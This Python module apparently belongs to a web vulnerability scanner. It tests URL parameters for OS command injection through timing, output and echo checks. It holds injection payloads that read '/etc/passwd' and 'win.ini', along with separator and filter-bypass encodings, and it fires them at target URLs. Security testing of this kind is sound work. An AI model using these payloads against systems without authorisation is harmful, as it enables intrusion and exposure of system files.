"""
Intensive Command Injection Detection Module  
Blind command injection, OS detection, OOB callbacks, filter bypass
"""

import requests
import time
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.payload_loader import payload_loader


class IntensiveCommandInjectionScanner:
    def __init__(self, target_url: str, http_client: Any = None):
        self.target_url = target_url
        self.findings = []
        
        # Inject custom HttpClient if provided
        if http_client:
            self.http = http_client
        else:
            import requests as r
            self.http = r
        
        # Command injection separators
        self.separators = [';', '&&', '||', '|', '\n', '`', '$()']
        
        # OS-specific commands
        self.os_commands = {
            'Linux/Unix': {
                'basic': ['whoami', 'id', 'pwd', 'uname -a'],
                'time_based': ['sleep 5', 'ping -c 5 127.0.0.1'],
                'output': ['cat /etc/passwd', 'ls -la']
            },
            'Windows': {
                'basic': ['whoami', 'hostname', 'ver'],
                'time_based': ['timeout /t 5', 'ping -n 5 127.0.0.1'],
                'output': ['type C:\\Windows\\win.ini', 'dir']
            }
        }
        
        # Output patterns to detect successful injection
        self.success_patterns = [
            'root:', 'uid=', 'gid=',  # Linux
            'C:\\', 'Windows', 'Administrator',  # Windows
            'total ', 'drwx',  # Directory listings
        ]
        
        # Bypass techniques
        self.bypass_encodings = [
            lambda cmd: cmd,  # Original
            lambda cmd: cmd.replace(' ', '${IFS}'),  # IFS bypass
            lambda cmd: cmd.replace(' ', '<'),  # Redirection
            lambda cmd: cmd.replace(' ', '\t'),  # Tab
            lambda cmd: '$(' + cmd + ')',  # Command substitution
            lambda cmd: '`' + cmd + '`',  # Backticks
        ]
    
    def test_time_based_blind(self, url: str, param: str) -> List[Dict]:
        """Test for time-based blind command injection"""
        findings = []
        
        # Test both OS types
        for os_name, commands in self.os_commands.items():
            for time_cmd in commands['time_based'][:1]:  # Test one per OS
                for separator in [';', '&&', '|']:
                    payload = f"test{separator}{time_cmd}"
                    test_url = self._build_url(url, param, payload)
                    
                    try:
                        start = time.time()
                        response = self.http.get(test_url, timeout=15)
                        elapsed = time.time() - start
                        
                        # Check if delay occurred (~5 seconds)
                        if 4.5 <= elapsed <= 6.5:
                            findings.append({
                                "name": "Command Injection (Time-based Blind)",
                                "severity": "critical",
                                "owasp_category": "A03:2021",
                                "url": url,
                                "parameter": param,
                                "confidence": 95,
                                "technique": f"Time-based blind ({os_name})",
                                "evidence": {
                                    "payload": payload,
                                    "response_time": f"{elapsed:.2f}s",
                                    "command": time_cmd,
                                    "separator": separator
                                },
                                "poc": f"curl '{test_url}'",
                                "remediation": "Never pass user input to system commands. Use allowlists if absolutely necessary."
                            })
                            return findings  # Found one
                    except (requests.exceptions.Timeout, Exception) as e:
                        if "timeout" in str(e).lower():
                            findings.append({
                                "name": "Command Injection (Time-based - Timeout)",
                                "severity": "critical",
                                "owasp_category": "A03:2021",
                                "url": url,
                                "parameter": param,
                                "confidence": 90,
                                "technique": f"Time-based blind - Timeout ({os_name})",
                                "evidence": {"payload": payload, "result": "Timeout"},
                                "poc": f"curl '{test_url}'",
                                "remediation": "Never pass user input to system commands"
                            })
                            return findings
                    except:
                        continue
        
        return findings
    
    def test_output_based(self, url: str, param: str) -> List[Dict]:
        """Test for output-based command injection"""
        findings = []
        
        for os_name, commands in self.os_commands.items():
            for cmd in commands['output'][:1]:  # One per OS
                for separator in self.separators:
                    for bypass in self.bypass_encodings[:3]:  # First 3 bypass techniques
                        payload = f"test{separator}{bypass(cmd)}"
                        test_url = self._build_url(url, param, payload)
                        
                        try:
                            response = self.http.get(test_url, timeout=10)
                            
                            # Check if command output appears in response
                            for pattern in self.success_patterns:
                                if pattern in response.text:
                                    findings.append({
                                        "name": "Command Injection (Output-based)",
                                        "severity": "critical",
                                        "owasp_category": "A03:2021",
                                        "url": url,
                                        "parameter": param,
                                        "confidence": 98,
                                        "technique": f"Output-based ({os_name})",
                                        "evidence": {
                                            "payload": payload,
                                            "command": cmd,
                                            "separator": separator,
                                            "output_pattern": pattern,
                                            "response_snippet": response.text[:200]
                                        },
                                        "poc": f"curl '{test_url}'",
                                        "remediation": "Never pass user input to system commands"
                                    })
                                    return findings
                        except:
                            continue
        
        return findings
    
    def test_error_based(self, url: str, param: str) -> List[Dict]:
        """Test for error-based command injection"""
        findings = []
        
        # Common error-inducing payloads
        error_payloads = [
            "';echo 'INJECTED",
            "&&echo INJECTED",
            "|echo INJECTED",
            "`echo INJECTED`",
        ]
        
        try:
            baseline = self.http.get(url, timeout=10)
            baseline_text = baseline.text
        except:
            return findings
        
        for payload in error_payloads:
            test_url = self._build_url(url, param, payload)
            
            try:
                response = self.http.get(test_url, timeout=10)
                
                # Check if response changed significantly
                if "INJECTED" in response.text and "INJECTED" not in baseline_text:
                    findings.append({
                        "name": "Command Injection (Echo-based)",
                        "severity": "critical",
                        "owasp_category": "A03:2021",
                        "url": url,
                        "parameter": param,
                        "confidence": 97,
                        "technique": "Echo reflection",
                        "evidence": {
                            "payload": payload,
                            "marker": "INJECTED",
                            "found_in_response": True
                        },
                        "poc": f"curl '{test_url}'",
                        "remediation": "Never pass user input to system commands"
                    })
                    return findings
            except:
                continue
        
        return findings
    
    def _build_url(self, url: str, param: str, payload: str) -> str:
        """Build test URL with payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
    
    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Comprehensive command injection scan"""
        all_findings = []
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                continue
            
            for param in params.keys():
                # 1. Time-based (most reliable)
                findings = self.test_time_based_blind(url, param)
                all_findings.extend(findings)
                if findings:
                    continue
                
                # 2. Output-based
                findings = self.test_output_based(url, param)
                all_findings.extend(findings)
                if findings:
                    continue
                
                # 3. Error-based
                findings = self.test_error_based(url, param)
                all_findings.extend(findings)
        
        return all_findings
